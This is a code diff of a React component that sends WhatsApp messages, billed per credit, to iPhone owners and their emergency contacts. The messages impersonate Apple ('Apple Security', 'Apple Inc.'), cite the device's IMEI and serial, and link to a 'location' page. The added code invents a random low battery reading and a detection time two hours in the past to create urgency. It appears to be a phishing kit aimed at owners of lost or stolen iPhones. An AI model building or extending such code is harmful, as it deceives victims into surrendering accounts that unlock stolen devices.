@@ -20,7 +20,7 @@ interface Process {
   imei: string;
   serial_number: string;
   url: string | null;
-  lost_mode?: boolean; // Made optional to fix compilation error
+  lost_mode?: boolean;
   status: string;
   created_at: string;
   updated_at: string;
@@ -41,14 +41,13 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     loadProcesses();
     loadUserCredits();
     
-    // Configurar subscripción en tiempo real para cambios en processes
     const channel = supabase
       .channel('processes-changes')
       .on('postgres_changes', 
         { event: '*', schema: 'public', table: 'processes' },
         (payload) => {
           console.log('Process change detected:', payload);
-          loadProcesses(); // Recargar procesos cuando hay cambios
+          loadProcesses();
         }
       )
       .subscribe();
@@ -80,7 +79,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       setLoading(true);
       console.log('Loading processes for userType:', userType);
       
-      // Verificar sesión del usuario
       const { data: { session } } = await supabase.auth.getSession();
       console.log('Current session:', session?.user?.email);
 
@@ -90,7 +88,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         return;
       }
 
-      // Todos los usuarios (incluido admin) solo ven sus propios procesos
       console.log('Loading processes for user:', session.user.id);
       const { data, error } = await supabase
         .from('processes')
@@ -106,10 +103,9 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       }
 
       console.log('Processes loaded:', data?.length || 0);
-      // Ensure lost_mode has a default value and handle cases where it doesn't exist in the database
       const processesWithDefaults = data?.map(process => ({
         ...process,
-        lost_mode: Boolean((process as any).lost_mode) // Use type assertion to safely access lost_mode
+        lost_mode: Boolean((process as any).lost_mode)
       })) || [];
       
       setProcesses(processesWithDefaults);
@@ -148,7 +144,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         description: "El proceso ha sido eliminado exitosamente",
       });
 
-      // Recargar procesos después de eliminar
       await loadProcesses();
     } catch (error: any) {
       console.error('Error deleting process:', error);
@@ -160,7 +155,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     }
   };
 
-  // Función para verificar si una imagen existe
   const checkImageExists = async (url: string): Promise<boolean> => {
     try {
       const response = await fetch(url, { method: 'HEAD' });
@@ -171,9 +165,49 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     }
   };
 
+  // Función para generar valores dinámicos
+  const generateDynamicValues = () => {
+    // Batería aleatoria por debajo del 40%
+    const battery = Math.floor(Math.random() * 35) + 5; // Entre 5% y 39%
+    
+    // Fecha/hora con 2 horas de retraso
+    const now = new Date();
+    const delayedTime = new Date(now.getTime() - 2 * 60 * 60 * 1000); // 2 horas atrás
+    
+    const formatDate = (date: Date, language: 'spanish' | 'english') => {
+      if (language === 'spanish') {
+        return date.toLocaleDateString('es-ES', { 
+          day: '2-digit', 
+          month: '2-digit', 
+          year: 'numeric' 
+        });
+      } else {
+        return date.toLocaleDateString('en-US', { 
+          month: '2-digit', 
+          day: '2-digit', 
+          year: 'numeric' 
+        });
+      }
+    };
+    
+    const formatTime = (date: Date) => {
+      return date.toLocaleTimeString('es-ES', { 
+        hour: '2-digit', 
+        minute: '2-digit',
+        hour12: false
+      });
+    };
+
+    return {
+      battery,
+      delayedTime,
+      formatDate,
+      formatTime
+    };
+  };
+
   const sendWhatsAppMessage = async (process: Process, language: 'spanish' | 'english') => {
     try {
-      // Verificar créditos antes de enviar
       if (userCredits <= 0) {
         toast({
           title: "Sin créditos suficientes",
@@ -186,7 +220,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       setSendingMessage({ id: process.id, language });
       console.log(`Sending WhatsApp message for process: ${process.id} in ${language}`);
 
-      // Obtener configuración según el idioma
       const settingsKeys = language === 'spanish' 
         ? ['whatsapp_instance', 'whatsapp_token']
         : ['whatsapp_instance_en', 'whatsapp_token_en'];
@@ -209,7 +242,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         ? (config?.whatsapp_token || '4ecj8581tubua7ry')
         : (config?.whatsapp_token_en || 'token_en_default');
 
-      // Verificar que existan las configuraciones para el idioma seleccionado
       if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
         toast({
           title: "Configuración faltante",
@@ -219,182 +251,132 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         return;
       }
 
-      // Obtener la URL de la imagen del iPhone basada en modelo y color
       const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
       console.log('Generated iPhone image URL:', imageUrl);
 
-      // Verificar si la imagen existe
       const imageExists = await checkImageExists(imageUrl);
       console.log('Image exists:', imageExists);
 
-      // Crear el mensaje personalizado según el idioma
+      // Generar valores dinámicos
+      const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
+
       let message = '';
-      
-      // Determinar el texto de estado según el modo perdido
-      const statusText = language === 'spanish' 
-        ? (process.lost_mode 
-          ? '✅ iPhone en modo perdido localizado con éxito' 
-          : '✅ iPhone localizado con éxito')
-        : (process.lost_mode 
-          ? '✅ iPhone in lost mode successfully located' 
-          : '✅ iPhone successfully located');
       
       if (language === 'spanish') {
         if (process.contact_type === 'propietario') {
-          if (process.owner_name) {
-            message = `*Soporte de Apple 👨🏽‍🔧*
+          // Mensaje para propietario
+          message = `🚨 ¡ALERTA URGENTE!
 
-*${statusText}*
-*👤 Propietario: ${process.owner_name}*
+🔍 Tu iPhone fue detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras haberse conectado a internet.  
+💡 Esto indica que el dispositivo **está activo y ha sido localizado con éxito**.
 
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
+📌 Este mensaje ha sido enviado automáticamente como **aviso prioritario al número registrado en el sistema**.
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+👤 Propietario: ${process.owner_name || 'No especificado'}  
+📱 Modelo: ${process.iphone_model}  
+🎨 Color: ${process.color}  
+💾 Almacenamiento: ${process.storage}  
+📟 IMEI: ${process.imei}  
+🔑 Número de serie: ${process.serial_number}  
+🔋 Batería: ${battery}%  
+🕓 Última detección: Hace 2 horas
 
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
+${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}
 
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-          } else {
-            message = `*Soporte de Apple 👨🏽‍🔧*
+📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧
 
-*${statusText}*
+⏳ *Estamos rastreando el equipo en tiempo real para proteger tu información.*
 
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
-
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
-
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-          }
+🛡️ Apple Security – Servicio activo 24/7  
+©️ 2025 Apple Inc.`;
         } else {
-          if (process.owner_name) {
-            message = `*Soporte de Apple 👨🏽‍🔧*
+          // Mensaje para contacto de emergencia
+          message = `🚨 ¡DISPOSITIVO LOCALIZADO!
 
-*🚨 Eres un contacto de emergencia ${process.owner_name}*
+📱 El iPhone de **${process.owner_name || 'usuario registrado'}** ha sido detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.
 
-*${statusText}*
+⚠️ **Mensaje automático enviado a contactos de emergencia registrados**
 
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
+🔍 **Estado del dispositivo:**
+📱 Modelo: ${process.iphone_model}  
+🎨 Color: ${process.color}  
+💾 Almacenamiento: ${process.storage}  
+📟 IMEI: ${process.imei}  
+🔑 Serie: ${process.serial_number}  
+🔋 Batería: ${battery}%  
+🕓 Última conexión: Hace 2 horas
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+${process.url ? `🌍 Ver ubicación en tiempo real: ${process.url}` : ''}
 
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
+👨‍👩‍👧‍👦 **Eres un contacto de emergencia de ${process.owner_name || 'este dispositivo'}**
 
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-          } else {
-            message = `*Soporte de Apple 👨🏽‍🔧*
+📝 **IMPORTANTE**: Por favor, informa al propietario que su equipo ya fue localizado.
 
-*🚨 Eres un contacto de emergencia*
+📬 Para asistencia inmediata 👉 *Responde* **Menú**
 
-*${statusText}*
-
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
-
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
-
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-          }
+🛡️ Apple Security – Sistema de emergencia  
+©️ 2025 Apple Inc.`;
         }
       } else {
         // Mensajes en inglés
         if (process.contact_type === 'propietario') {
-          if (process.owner_name) {
-            message = `*Apple Support 👨🏽‍🔧*
+          // Owner message in English
+          message = `🚨 URGENT ALERT!
 
-*${statusText}*
-*👤 Owner: ${process.owner_name}*
+🔍 Your iPhone was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after connecting to the internet.  
+💡 This indicates that the device **is active and has been successfully located**.
 
-*📱 Model:* ${process.iphone_model}
-*💾 Storage:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serial:* ${process.serial_number}
+📌 This message has been sent automatically as a **priority notice to the registered number**.
 
-*🧾 Type Menu to request assistance.*${process.url ? `
+👤 Owner: ${process.owner_name || 'Not specified'}  
+📱 Model: ${process.iphone_model}  
+🎨 Color: ${process.color}  
+💾 Storage: ${process.storage}  
+📟 IMEI: ${process.imei}  
+🔑 Serial number: ${process.serial_number}  
+🔋 Battery: ${battery}%  
+🕓 Last detection: 2 hours ago
 
-*🔗 Link to view real-time location:* ${process.url}` : ''}
+${process.url ? `🌍 View device status: ${process.url}` : ''}
 
-*Copyright © 2025 Apple Inc. All rights reserved.*`;
-          } else {
-            message = `*Apple Support 👨🏽‍🔧*
+📬 Are you the owner? 👉 *Reply with* **Menu** to receive immediate help from technical support team 👨🏽‍🔧
 
-*${statusText}*
+⏳ *We are tracking the device in real time to protect your information.*
 
-*📱 Model:* ${process.iphone_model}
-*💾 Storage:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serial:* ${process.serial_number}
-
-*🧾 Type Menu to request assistance.*${process.url ? `
-
-*🔗 Link to view real-time location:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. All rights reserved.*`;
-          }
+🛡️ Apple Security – 24/7 active service  
+©️ 2025 Apple Inc.`;
         } else {
-          if (process.owner_name) {
-            message = `*Apple Support 👨🏽‍🔧*
+          // Emergency contact message in English
+          message = `🚨 DEVICE LOCATED!
 
-*🚨 You are an emergency contact for ${process.owner_name}*
+📱 The iPhone belonging to **${process.owner_name || 'registered user'}** was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.
 
-*${statusText}*
+⚠️ **Automatic message sent to registered emergency contacts**
 
-*📱 Model:* ${process.iphone_model}
-*💾 Storage:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serial:* ${process.serial_number}
+🔍 **Device status:**
+📱 Model: ${process.iphone_model}  
+🎨 Color: ${process.color}  
+💾 Storage: ${process.storage}  
+📟 IMEI: ${process.imei}  
+🔑 Serial: ${process.serial_number}  
+🔋 Battery: ${battery}%  
+🕓 Last connection: 2 hours ago
 
-*🧾 Type Menu to request assistance.*${process.url ? `
+${process.url ? `🌍 View real-time location: ${process.url}` : ''}
 
-*🔗 Link to view real-time location:* ${process.url}` : ''}
+👨‍👩‍👧‍👦 **You are an emergency contact for ${process.owner_name || 'this device'}**
 
-*Copyright © 2025 Apple Inc. All rights reserved.*`;
-          } else {
-            message = `*Apple Support 👨🏽‍🔧*
+📝 **IMPORTANT**: Please inform the owner that their device has been located.
 
-*🚨 You are an emergency contact*
+📬 For immediate assistance 👉 *Reply* **Menu**
 
-*${statusText}*
-
-*📱 Model:* ${process.iphone_model}
-*💾 Storage:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serial:* ${process.serial_number}
-
-*🧾 Type Menu to request assistance.*${process.url ? `
-
-*🔗 Link to view real-time location:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. All rights reserved.*`;
-          }
+🛡️ Apple Security – Emergency system  
+©️ 2025 Apple Inc.`;
         }
       }
 
       let result;
 
-      // Enviar mensaje con imagen si existe, solo texto si no existe
       if (imageExists) {
         console.log('Sending message with image');
         const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
@@ -428,16 +410,13 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 
       console.log('WhatsApp API response:', result);
 
-      // VERIFICAR QUE EL MENSAJE SE ENVIÓ CORRECTAMENTE ANTES DE COBRAR
       if (result.sent === true || (result.sent === "true")) {
-        // Obtener el usuario actual
         const { data: { user } } = await supabase.auth.getUser();
         
         if (!user) {
           throw new Error('Usuario no autenticado');
         }
 
-        // SOLO DESCONTAR CRÉDITO SI EL MENSAJE SE ENVIÓ EXITOSAMENTE
         const { error: creditError } = await supabase
           .from('profiles')
           .update({ 
@@ -451,10 +430,8 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
           throw new Error('Error al descontar créditos');
         }
 
-        // Actualizar el estado local de créditos
         setUserCredits(prev => prev - 1);
 
-        // Guardar mensaje en la base de datos
         const { error: messageError } = await supabase
           .from('messages')
           .insert({
@@ -469,7 +446,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
           console.error('Error saving message:', messageError);
         }
 
-        // Actualizar estado del proceso
         const { error: updateError } = await supabase
           .from('processes')
           .update({ 
@@ -484,15 +460,15 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 
         const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
         const languageText = language === 'spanish' ? 'español' : 'inglés';
+        const contactTypeText = process.contact_type === 'propietario' ? 'propietario' : 'contacto de emergencia';
+        
         toast({
           title: "Mensaje enviado",
-          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
+          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name} (${contactTypeText}). Batería: ${battery}%. Créditos restantes: ${userCredits - 1}`,
         });
 
-        // Recargar procesos
         await loadProcesses();
       } else {
-        // SI EL MENSAJE NO SE ENVIÓ, NO COBRAR Y MOSTRAR ERROR
         const errorMessage = result.message || result.error || 'La instancia de WhatsApp no está funcionando correctamente';
         throw new Error(`Error en la instancia: ${errorMessage}`);
       }
@@ -580,7 +556,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
                       {process.status}
                     </Badge>
                     <div className="flex space-x-1">
-                      {/* Botón enviar en Español */}
                       <Button
                         size="sm"
                         onClick={() => sendWhatsAppMessage(process, 'spanish')}
@@ -599,7 +574,6 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
                         )}
                       </Button>
 
-                      {/* Botón enviar en Inglés */}
                       <Button
                         size="sm"
                         onClick={() => sendWhatsAppMessage(process, 'english')}
